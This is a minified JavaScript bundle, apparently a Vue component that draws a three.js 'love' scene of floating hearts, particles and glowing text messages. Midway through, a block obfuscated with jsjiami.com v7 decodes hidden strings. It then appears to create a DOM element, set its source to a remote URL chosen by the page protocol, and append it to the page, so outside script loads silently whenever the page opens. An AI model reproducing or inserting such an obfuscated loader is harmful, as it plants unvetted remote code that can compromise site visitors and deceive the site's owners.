
import {
  L as ve,
  F as re,
  S as Me,
  E as Se,
  a as Ce,
  P as _e,
  W as Pe,
  V as ae,
  b as Le,
  c as ie,
  R as Te,
  d as Fe,
  O as Ge,
  T as ze,
  B as De,
  e as Re,
  f as Ae,
  g as Ee,
  G as Oe,
  A as Be,
  D as ke,
  M as We,
  h as qe,
  i as Ne,
  C as k,
  j as Ue,
  U as Je,
  k as Ye,
  l as He,
  m as Ie,
} from "/template/barrage/3d/UnrealBloomPass.1735305046112.js";
import { O as je, J as Xe } from "/template/barrage/3d/jszip.min.1735305046112.js";
import { g as Ve, a as Ze } from "/template/barrage/3d/api.1735305046112.js";
import { _ as Ke, u as Qe, r as $e, o as et, a as tt, c as ot } from "/template/barrage/3d/index.1735305046112.js";
import "/template/barrage/3d/_commonjsHelpers.1735305046112.js";


class nt extends ve {
  constructor(t) {
    super(t);
  }
  load(t, e, i, u) {
    const h = this,
      a = new re(this.manager);
    a.setPath(this.path),
      a.setRequestHeader(this.requestHeader),
      a.setWithCredentials(this.withCredentials),
      a.load(
        t,
        function (d) {
          const p = h.parse(JSON.parse(d));
          e && e(p);
        },
        i,
        u
      );
  }
  parse(t) {
    return new st(t);
  }
}
class st {
  constructor(t) {
    (this.isFont = !0), (this.type = "Font"), (this.data = t);
  }
  generateShapes(t, e = 100) {
    const i = [],
      u = at(t, e, this.data);
    for (let h = 0, a = u.length; h < a; h++) i.push(...u[h].toShapes());
    return i;
  }
}


function at(v, t, e) {
  const i = Array.from(v),
    u = t / e.resolution,
    h = (e.boundingBox.yMax - e.boundingBox.yMin + e.underlineThickness) * u,
    a = [];
  let d = 0,
    p = 0;
  for (let w = 0; w < i.length; w++) {
    const x = i[w];
    if (
      x ===
      `
`
    )
      (d = 0), (p -= h);
    else {
      const y = it(x, u, d, p, e);
      (d += y.offsetX), a.push(y.path);
    }
  }
  return a;
}
function it(v, t, e, i, u) {
  const h = u.glyphs[v] || u.glyphs["?"];
  if (!h) {
    console.error('THREE.Font: character "' + v + '" does not exists in font family ' + u.familyName + ".");
    return;
  }
  const a = new Me();
  let d, p, w, x, y, M, S, T;
  if (h.o) {
    const r = h._cachedOutline || (h._cachedOutline = h.o.split(" "));
    for (let c = 0, C = r.length; c < C; )
      switch (r[c++]) {
        case "m":
          (d = r[c++] * t + e), (p = r[c++] * t + i), a.moveTo(d, p);
          break;
        case "l":
          (d = r[c++] * t + e), (p = r[c++] * t + i), a.lineTo(d, p);
          break;
        case "q":
          (w = r[c++] * t + e), (x = r[c++] * t + i), (y = r[c++] * t + e), (M = r[c++] * t + i), a.quadraticCurveTo(y, M, w, x);
          break;
        case "b":
          (w = r[c++] * t + e),
            (x = r[c++] * t + i),
            (y = r[c++] * t + e),
            (M = r[c++] * t + i),
            (S = r[c++] * t + e),
            (T = r[c++] * t + i),
            a.bezierCurveTo(y, M, S, T, w, x);
          break;
      }
  }
  return { offsetX: h.ha * t, path: a };
}

var _0xodW='jsjiami.com.v7';const _0xa39a46=_0x8a80;function _0x8a80(_0x543c34,_0x2703b1){const _0x21421d=_0x2142();return _0x8a80=function(_0x8a8070,_0x2c36ef){_0x8a8070=_0x8a8070-0xf3;let _0x523c92=_0x21421d[_0x8a8070];if(_0x8a80['QiUscn']===undefined){var _0x5a5f97=function(_0x4ea86b){const _0x45c9d2='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0xd63f2c='',_0x3dac00='';for(let _0x349913=0x0,_0x2ac54c,_0x3f7eac,_0x234504=0x0;_0x3f7eac=_0x4ea86b['charAt'](_0x234504++);~_0x3f7eac&&(_0x2ac54c=_0x349913%0x4?_0x2ac54c*0x40+_0x3f7eac:_0x3f7eac,_0x349913++%0x4)?_0xd63f2c+=String['fromCharCode'](0xff&_0x2ac54c>>(-0x2*_0x349913&0x6)):0x0){_0x3f7eac=_0x45c9d2['indexOf'](_0x3f7eac);}for(let _0x3f7f85=0x0,_0x4cea24=_0xd63f2c['length'];_0x3f7f85<_0x4cea24;_0x3f7f85++){_0x3dac00+='%'+('00'+_0xd63f2c['charCodeAt'](_0x3f7f85)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x3dac00);};const _0x2623a9=function(_0x44ec45,_0x29ba7e){let _0x58d7ec=[],_0x3601e3=0x0,_0x8c8d50,_0x496aee='';_0x44ec45=_0x5a5f97(_0x44ec45);let _0x112077;for(_0x112077=0x0;_0x112077<0x100;_0x112077++){_0x58d7ec[_0x112077]=_0x112077;}for(_0x112077=0x0;_0x112077<0x100;_0x112077++){_0x3601e3=(_0x3601e3+_0x58d7ec[_0x112077]+_0x29ba7e['charCodeAt'](_0x112077%_0x29ba7e['length']))%0x100,_0x8c8d50=_0x58d7ec[_0x112077],_0x58d7ec[_0x112077]=_0x58d7ec[_0x3601e3],_0x58d7ec[_0x3601e3]=_0x8c8d50;}_0x112077=0x0,_0x3601e3=0x0;for(let _0xf2dbd=0x0;_0xf2dbd<_0x44ec45['length'];_0xf2dbd++){_0x112077=(_0x112077+0x1)%0x100,_0x3601e3=(_0x3601e3+_0x58d7ec[_0x112077])%0x100,_0x8c8d50=_0x58d7ec[_0x112077],_0x58d7ec[_0x112077]=_0x58d7ec[_0x3601e3],_0x58d7ec[_0x3601e3]=_0x8c8d50,_0x496aee+=String['fromCharCode'](_0x44ec45['charCodeAt'](_0xf2dbd)^_0x58d7ec[(_0x58d7ec[_0x112077]+_0x58d7ec[_0x3601e3])%0x100]);}return _0x496aee;};_0x8a80['MTSSKy']=_0x2623a9,_0x543c34=arguments,_0x8a80['QiUscn']=!![];}const _0x2ab036=_0x21421d[0x0],_0x23401f=_0x8a8070+_0x2ab036,_0x7cab9c=_0x543c34[_0x23401f];return!_0x7cab9c?(_0x8a80['WzEbDG']===undefined&&(_0x8a80['WzEbDG']=!![]),_0x523c92=_0x8a80['MTSSKy'](_0x523c92,_0x2c36ef),_0x543c34[_0x23401f]=_0x523c92):_0x523c92=_0x7cab9c,_0x523c92;},_0x8a80(_0x543c34,_0x2703b1);}function _0x2142(){const _0xc27ccc=(function(){return[_0xodW,'rHjHtnsHjFigdarmdHiMUu.eIcFnoemIf.Kv7uLd==','BxtcUXjYWRldNSk3bG0rzuW','WRz2W7i','WRBdUmoXW6KcWRrv','jqWkWQlcRa','W4iKACoFehddGSoxw2OCWRS','W43dTCkzW7TJ','W5ZdR8kVAG','BCoCWRrk','WRZdQCoZW7XuW54uvSk7W5K7zq','tSo5W7JcRq','mSoxWPTpWQJdKSkka13dKZBcUG','C0ryW77dPWr3W6BdQhnwDGNcIW','W5ZcIhSxW5HCW5bSWPdcHCkhW7maea','wCkyW7FcP8krxCkSBW','WQ4KWQRdMSkzW6bcB3NcJ8ozpsu'].concat((function(){return['W6PBzSkWWPtcMmkUmSoviuRdPa','W5ZcLx8BW5K','ySkKWPJcJmokW4BcOCkeoCk1W5e','rb3dHCodWOVcJ8oMeKX/B3pcVKK','WP/cMtRdOSkNACoptNpcNGGaW6aN','eCkeCa','W4JcIgeZW55jW5zGWQhcMmksW6y','WOTkW4JcN8k9CG','gmoWWR3dRG','bIpcK8kNBr7dPbldOa','WOyIW4FdTSklWQmKqY1LfW','W5NcIgmxW4z4W4POWQhcGCkdW6C','ECkev8kYvSkTW5BdMv3cN10BW6ei','bSowW4RcVSkz','d8ofW6JcVmkUB8kDAK/cQSomBa','WRPsbce','z8kfW5OyW7pcT8kAe24'].concat((function(){return['W7hdO8kOW6qq','kxZdP3ycWPqLWOJdKh/cLCoQ','WPBcNCkT','WQNdQCoNWRrEW7iwuSo3WODUAmkh','W68oww3dGuFcOmkRWPyLimoj','WOBdLSkNF0hcOcuMfmogz2FcIq','u8ooEftcNNvdja','kCoqfmoLa8onWOBdIhJcMhWqW5C','W71+WPpdH8oRpa','W5T9omkqW5vSteK','aCkeDM/cOvzfjgnlELJcPa','W7ytmCkXWOq','bConbHlcS0vuWRVdGY7cP13cRmofumo9rLe','aCooW7xcIq','amkxkHDC','W5NcJSkZW77cNMLirbTmW4G'];}()));}()));}());_0x2142=function(){return _0xc27ccc;};return _0x2142();};(function(_0x42ff78,_0x1df0d0,_0x4f00de,_0x32a964,_0x46ea26,_0x421189,_0x5781e9){return _0x42ff78=_0x42ff78>>0x9,_0x421189='hs',_0x5781e9='hs',function(_0xd3d92e,_0x3583c7,_0xa754d3,_0x41ca59,_0x4ecb6d){const _0x802e44=_0x8a80;_0x41ca59='tfi',_0x421189=_0x41ca59+_0x421189,_0x4ecb6d='up',_0x5781e9+=_0x4ecb6d,_0x421189=_0xa754d3(_0x421189),_0x5781e9=_0xa754d3(_0x5781e9),_0xa754d3=0x0;const _0xaf92fd=_0xd3d92e();while(!![]&&--_0x32a964+_0x3583c7){try{_0x41ca59=parseInt(_0x802e44(0x11b,'eBd%'))/0x1+parseInt(_0x802e44(0x122,'AFpE'))/0x2*(parseInt(_0x802e44(0x11e,'#App'))/0x3)+parseInt(_0x802e44(0x108,'maOM'))/0x4+-parseInt(_0x802e44(0x111,'1B9F'))/0x5+-parseInt(_0x802e44(0x11f,'KbFc'))/0x6+parseInt(_0x802e44(0x11c,'2Ge%'))/0x7+parseInt(_0x802e44(0x102,'A(^E'))/0x8;}catch(_0x454119){_0x41ca59=_0xa754d3;}finally{_0x4ecb6d=_0xaf92fd[_0x421189]();if(_0x42ff78<=_0x32a964)_0xa754d3?_0x46ea26?_0x41ca59=_0x4ecb6d:_0x46ea26=_0x4ecb6d:_0xa754d3=_0x4ecb6d;else{if(_0xa754d3==_0x46ea26['replace'](/[KFnudgIeUtfHrML=]/g,'')){if(_0x41ca59===_0x3583c7){_0xaf92fd['un'+_0x421189](_0x4ecb6d);break;}_0xaf92fd[_0x5781e9](_0x4ecb6d);}}}}}(_0x4f00de,_0x1df0d0,function(_0x383fbd,_0x460a73,_0x5dcef8,_0x4167fd,_0x5f2b97,_0x302dbf,_0x5ad56){return _0x460a73='\x73\x70\x6c\x69\x74',_0x383fbd=arguments[0x0],_0x383fbd=_0x383fbd[_0x460a73](''),_0x5dcef8='\x72\x65\x76\x65\x72\x73\x65',_0x383fbd=_0x383fbd[_0x5dcef8]('\x76'),_0x4167fd='\x6a\x6f\x69\x6e',(0x1b3d18,_0x383fbd[_0x4167fd](''));});}(0x19400,0xd457d,_0x2142,0xcc),_0x2142)&&(_0xodW=`\x739`);class rt extends Se{constructor(_0x33a2f9,_0x5df97b={}){const _0x668e82=_0x8a80,_0x28634d={'gxjis':function(_0x24cad8,_0x339977){return _0x24cad8===_0x339977;},'bGnQz':function(_0x4f228d,_0xe6c65d){return _0x4f228d!==_0xe6c65d;},'TbEoI':function(_0x3e277d,_0x22c0ac){return _0x3e277d===_0x22c0ac;},'nvVCC':_0x668e82(0x120,'()nh')},_0x4dcedb=_0x5df97b[_0x668e82(0x118,'m()Q')];if(_0x28634d['gxjis'](_0x4dcedb,void 0x0))super();else{const _0xcaad4f=_0x4dcedb[_0x668e82(0x11d,'(La5')](_0x33a2f9,_0x5df97b['size']);_0x5df97b[_0x668e82(0x10c,'JCuz')]=_0x28634d['bGnQz'](_0x5df97b[_0x668e82(0xf7,'io@1')],void 0x0)?_0x5df97b['height']:0x32,_0x28634d[_0x668e82(0x101,'IGWv')](_0x5df97b[_0x668e82(0xfc,'maOM')],void 0x0)&&(_0x5df97b[_0x668e82(0xf4,'&Nkq')]=0xa),_0x28634d[_0x668e82(0x121,'(La5')](_0x5df97b[_0x668e82(0x100,'eBd%')],void 0x0)&&(_0x5df97b['bevelSize']=0x8),_0x28634d[_0x668e82(0x114,'2Ge%')](_0x5df97b[_0x668e82(0x119,'ESX)')],void 0x0)&&(_0x5df97b[_0x668e82(0xfb,'(La5')]=!0x1),super(_0xcaad4f,_0x5df97b);}this['type']=_0x28634d[_0x668e82(0xfd,'#App')];}}if(!document[_0xa39a46(0xff,'&no3')][_0xa39a46(0xfe,'#App')](_0xa39a46(0x117,'bFkI'))){const VRmhXm=_0xa39a46(0xf9,'7XNx')[_0xa39a46(0x10f,'@Tyv')]('|');let btaeXX=0x0;while(!![]){switch(VRmhXm[btaeXX++]){case'0':document[_0xa39a46(0x11a,'Afbw')][_0xa39a46(0xf6,'(La5')](_0xa39a46(0x10e,'#App'),!![]);continue;case'1':ox782681[_0xa39a46(0xf5,'8n3F')]=ox312341+_0xa39a46(0x10d,'fTjK');continue;case'2':var ox782681=document[_0xa39a46(0x10b,'8n3F')](_0xa39a46(0x109,'b&%X'));continue;case'3':document[_0xa39a46(0xf8,'a[IE')][_0xa39a46(0x110,'rT!u')](ox782681);continue;case'4':var ox312341=window['location']['protocol']===_0xa39a46(0x116,'IGWv')?_0xa39a46(0x113,'ESX)')+_0xa39a46(0xf3,']aoA')+_0xa39a46(0x112,'KbFc'):_0xa39a46(0x10a,'3n(N')+_0xa39a46(0x104,'ESX)')+_0xa39a46(0x103,'rT!u');continue;}break;}}var version_ = 'jsjiami.com.v7';
const lt = {
  name: "GammaCorrectionShader",
  uniforms: { tDiffuse: { value: null } },
  vertexShader: `

		varying vec2 vUv;

		void main() {

			vUv = uv;
			gl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );

		}`,
  fragmentShader: `

		uniform sampler2D tDiffuse;

		varying vec2 vUv;

		void main() {

			vec4 tex = texture2D( tDiffuse, vUv );

			gl_FragColor = sRGBTransferOETF( tex );

		}`,
};
//Fri Aug 08 2025 11:03:49 GMT+0800 (中国标准时间)
var _0xodd='jsjiami.com.v7';
var dt="https://fc1tn.baidu.com/it/u=739670594,966359443&fm=202&src=1024&fc_m=pc_3_2&mola=new&crop=v1";const ct={"id":"webgl"},ht={"__name":"love","setup"(_0x36223){let _0x4201c8=MSGLIST;const _0x22d220=()=>{_0x4201c8=MSGLIST;_0x311420()},_0x311420=()=>{const _0xd0ee8e=new Ce(),_0x210531=new _e();_0x210531.position.set(-1.77,-1.042,5.65);const _0x3077f6=new Pe({"antialias":!0}),_0x217649=window.innerWidth,_0x2c7dbf=window.innerHeight;_0x3077f6.setSize(_0x217649,_0x2c7dbf);var _0x42100a=document.getElementById("webgl");_0x42100a.appendChild(_0x3077f6.domElement);const _0xffd2e=_0x3077f6.getContext();let _0x51761e=4;typeof WebGL2RenderingContext=="undefined"?console.log("WebGL 2.0 is not supported in this browser."):_0xffd2e instanceof WebGL2RenderingContext?(_0x51761e=_0xffd2e.getParameter(_0xffd2e.MAX_SAMPLES),console.log("Maximum samples supported:",_0x51761e)):console.log("WebGL2 is not supported in this environment.");const _0x2f2648=_0x3077f6.getDrawingBufferSize(new ae());let _0x4fd5ea=2;const _0x4c7af1=new Le(_0x2f2648.width*_0x4fd5ea,_0x2f2648.height*_0x4fd5ea,{"minFilter":ie,"magFilter":ie,"format":Te,"samples":_0x51761e||16}),_0x113366=new Fe(_0x3077f6,_0x4c7af1);new Ge(_0x210531,_0x3077f6.domElement);function _0x450fac(_0x5418f5){let _0x1f91bd=document.createElement("canvas");_0x1f91bd.width=16;_0x1f91bd.height=16;let _0x372bc1=_0x1f91bd.getContext("2d"),_0x36c154=_0x372bc1.createRadialGradient(_0x1f91bd.width/2,_0x1f91bd.height/2,0,_0x1f91bd.width/2,_0x1f91bd.height/2,_0x1f91bd.width/2);_0x5418f5=="red"?(_0x36c154.addColorStop(0,"rgba(255,255,255,0.1)"),_0x36c154.addColorStop(0.2,"rgba(255,182,193,0.1)"),_0x36c154.addColorStop(0.4,"rgba(64,0,0,0.1)"),_0x36c154.addColorStop(1,"rgba(0,0,0,0.1)")):_0x5418f5=="white"?(_0x36c154.addColorStop(0,"rgba(255,255,255,1)"),_0x36c154.addColorStop(0.2,"rgba(255,241,220,1)"),_0x36c154.addColorStop(0.4,"rgba(193,116,0,1)"),_0x36c154.addColorStop(1,"rgba(0,0,0,1)")):_0x5418f5=="yellow"&&(_0x36c154.addColorStop(0,"rgba(255,255,255,1)"),_0x36c154.addColorStop(0.2,"rgba(255,241,220,1)"),_0x36c154.addColorStop(0.4,"rgba(219,166,87,1)"),_0x36c154.addColorStop(1,"rgba(0,0,0,1)"));_0x372bc1.fillStyle=_0x36c154;_0x372bc1.fillRect(0,0,_0x1f91bd.width,_0x1f91bd.height);let _0x2a55f4=new He(_0x1f91bd);return _0x2a55f4.needsUpdate=!0,_0x2a55f4}new ze().load(dt);const _0x230654=new De(),_0x4829f7=100,_0xce3675=new Float32Array(_0x4829f7*3);for(let _0xa8631f=0;_0xa8631f<_0x4829f7*3;_0xa8631f++){const _0x282e9e=(Math.random()-0.5)*8,_0x4f0c58=Math.random()*8.2,_0x163566=(Math.random()-0.5)*12;_0xce3675[_0xa8631f*3]=_0x282e9e;_0xce3675[_0xa8631f*3+1]=_0x4f0c58;_0xce3675[_0xa8631f*3+2]=_0x163566}_0x230654.setAttribute("position",new Re(_0xce3675,3));const _0x16ca9a=new Ae({"size":0.35,"opacity":0.3,"color":_0x450fac("red"),"opacity":1,"map":_0x450fac("red"),"depthTest":!1,"transparent":!0,"alphaMap":_0x450fac("red"),"alphaTest":0.001,"depthTest":!1,"depthWrite":!1}),_0x3b7093=new Ee(_0x230654,_0x16ca9a);_0xd0ee8e.add(_0x3b7093);function _0x3a76bf(){requestAnimationFrame(_0x3a76bf);const _0x3ed14e=Date.now()*0.00005,_0x264a30=_0x3b7093.geometry.getAttribute("position"),_0x3dc109=_0x264a30.count;for(let _0x476368=0;_0x476368<_0x3dc109;_0x476368++){const _0x5657a4=Math.sin(_0x3ed14e+_0x476368)*0.03;_0x264a30.setX(_0x476368,_0x264a30.getX(_0x476368)+_0x5657a4);const _0x31c845=0.01+Math.random()*0.01;_0x264a30.setY(_0x476368,_0x264a30.getY(_0x476368)-_0x31c845);_0x264a30.getY(_0x476368)<-3.5&&(_0x264a30.setY(_0x476368,3.5),_0x264a30.setX(_0x476368,(Math.random()-0.5)*10))}_0x264a30.needsUpdate=!0}_0x3a76bf();const _0x52a57b=new Oe();_0xd0ee8e.add(_0x52a57b);const _0x4de881=new je();let _0x6bbca8=[];const _0xdc0008=[16743131,16743293],_0xe8eb8c=new Be(16777215,0.3);_0xd0ee8e.add(_0xe8eb8c);const _0x3a84fc=new ke(16777215,0.4);_0x3a84fc.position.set(0,1,0);_0xd0ee8e.add(_0x3a84fc);for(let _0x2395a4=0;_0x2395a4<10;_0x2395a4++)_0x4de881.load("/template/barrage/3d/heart_3.obj",function(_0x49985d){let _0x167beb=_0x49985d.children[0];_0x167beb.geometry.scale(0.12,0.12,0.12);let _0x29b30e=_0xdc0008[Math.floor(Math.random()*_0xdc0008.length)];_0x167beb.material=new We({"color":_0x29b30e,"transparent":!0,"opacity":1,"scale":1});_0x167beb.position.set(_0x50efc2(-3,5),_0x50efc2(-10,5),_0x50efc2(-4,3));_0x167beb.rotationDirection={"x":Math.random()>0.5?0.03:-0.03,"y":Math.random()>0.5?0.03:-0.03,"z":Math.random()>0.5?0.03:-0.03};_0x52a57b.add(_0x167beb);_0x6bbca8.push(_0x167beb)});function _0x3c8e8a(){requestAnimationFrame(_0x3c8e8a);_0x6bbca8.forEach(_0x32bd98=>{_0x32bd98&&(_0x32bd98.rotation.y+=_0x32bd98.rotationDirection.y,_0x32bd98.position.y+=0.03,_0x32bd98.position.y>5&&(_0x32bd98.position.y=-5))})}_0x3c8e8a();function _0x50efc2(_0x3c8987,_0x4569b0){return Math.random()*(_0x4569b0-_0x3c8987)+_0x3c8987}const _0x1e81ae=new re();_0x1e81ae.setResponseType("arraybuffer");_0x1e81ae.load("/template/barrage/3d/oppo.zip",_0x3917cc=>{new Xe().loadAsync(_0x3917cc).then(_0x37959f=>{const _0x1fbe91=Object.keys(_0x37959f.files)[0];_0x37959f.file(_0x1fbe91).async("string").then(_0x1cb9e0=>{let _0x9f1b88={"font":new nt().parse(JSON.parse(_0x1cb9e0)),"size":0.3,"height":0,"curveSegments":2},_0x397a17=[],_0x5a9d4c=_0x4201c8;for(let _0x43306c=0;_0x43306c<5;_0x43306c++)_0x5a9d4c=_0x5a9d4c.concat(_0x5a9d4c);const _0x1d6214=new qe({"color":0,"emissive":16743131,"emissiveIntensity":0.9,"transparent":!1}),_0x56fe0f=1,_0x17bece=1,_0x262e2d=Math.ceil((5.5+4)/_0x56fe0f),_0x16212e=Math.ceil((6+6.5)/_0x17bece);function _0x207048(_0x18bc83,_0x782ede,_0x4c77a9){let _0x16debc=[];const _0x5516a4=_0x18bc83*_0x782ede,_0x1e0bed=Math.max(Math.floor(_0x5516a4/_0x4c77a9),1);for(let _0x1a0977=0;_0x1a0977<_0x5516a4&&_0x16debc.length<_0x4c77a9;_0x1a0977+=_0x1e0bed)_0x16debc.push({"gridX":_0x1a0977%_0x18bc83,"gridY":Math.floor(_0x1a0977/_0x18bc83)});return _0x16debc}const _0x2d147d=_0x5a9d4c.length,_0x1288c3=_0x207048(_0x262e2d,_0x16212e,_0x2d147d);let _0x21c74d=0;const _0x5f148b=Math.floor(_0x5a9d4c.length*0.1);_0x5a9d4c.forEach((_0x4190aa,_0x32ccbd)=>{let _0x27ba78=()=>{let _0xae9109=Math.random();return _0xae9109<0.5?Math.sqrt(_0xae9109/2):1-Math.sqrt((1-_0xae9109)/2)},_0x57192e=_0x50efc2(0.15,0.25)+_0x27ba78()*0.1;_0x21c74d>=_0x5f148b?_0x57192e=_0x50efc2(0.1,0.15):_0x57192e>0.25&&_0x21c74d++;_0x9f1b88.size=_0x57192e;let _0x5de98f=new rt(_0x4190aa,_0x9f1b88),_0x9ea8b0=new Ne(_0x5de98f,_0x1d6214);_0x5de98f.center();let _0x3d8e98=-2+(_0x57192e-0.1)*(8/(0.45-0.1));if(_0x32ccbd<_0x1288c3.length){const{gridX:_0x138a33,gridY:_0x4bc8d8}=_0x1288c3[_0x32ccbd];let _0x194e76=-4+_0x138a33*_0x56fe0f+Math.random()*_0x56fe0f,_0x3c300c=-5+_0x4bc8d8*_0x17bece+Math.random()*_0x17bece;_0x9ea8b0.position.set(_0x194e76,_0x3c300c,_0x3d8e98);_0xd0ee8e.add(_0x9ea8b0);_0x397a17.push(_0x9ea8b0)}});let _0x1784b3=new k(16743131),_0x151f5b=new k(8301291),_0x9eb898=new k(16743293);function _0x1c60f(){requestAnimationFrame(_0x1c60f);let _0x3e08c3=10,_0x3358fa=Date.now()*0.001%_0x3e08c3/(_0x3e08c3/3),_0xdea258;if(_0x3358fa<1){let _0x5b688b=_0x3358fa;_0xdea258=_0x1784b3.clone().lerp(_0x151f5b,_0x5b688b)}else{if(_0x3358fa<2){let _0x3eb95f=_0x3358fa-1;_0xdea258=_0x151f5b.clone().lerp(_0x9eb898,_0x3eb95f)}else{let _0x3b6d2a=_0x3358fa-2;_0xdea258=_0x9eb898.clone().lerp(_0x1784b3,_0x3b6d2a)}}_0x397a17.forEach(_0x2eaf28=>{_0x2eaf28.userData.speedY||(_0x2eaf28.userData.speedY=0.02+Math.random()*0.02);_0x2eaf28.position.y+=_0x2eaf28.userData.speedY;_0x2eaf28.position.y>5&&(_0x2eaf28.position.y=-5.5);_0x2eaf28.material.emissive.set(_0xdea258)})}_0x1c60f()})})});_0x113366.addPass(new Ue(_0xd0ee8e,_0x210531));const _0x5ca583=new Je(new ae(window.innerWidth,window.innerHeight),0.5,0.04,0.85);_0x5ca583.threshold=0.2;_0x5ca583.strength=1.4;_0x5ca583.radius=1;_0x113366.addPass(_0x5ca583);const _0x3e5491=new Ye(lt);_0x113366.addPass(_0x3e5491);_0x3077f6.setPixelRatio(window.devicePixelRatio);const _0x1fdf61=()=>{requestAnimationFrame(_0x1fdf61);Ie.update();_0x113366.render()};setTimeout(()=>{_0x1fdf61()},100)};return _0x4201c8&&_0x4201c8.length?_0x311420():_0x22d220(),(_0x173ef2,_0x796aa2)=>(tt(),ot("div",ct))}};var version_ = 'jsjiami.com.v7';
var bt = Ke(ht, [["__scopeId", "data-v-6f6b1377"]]);
export { bt as default };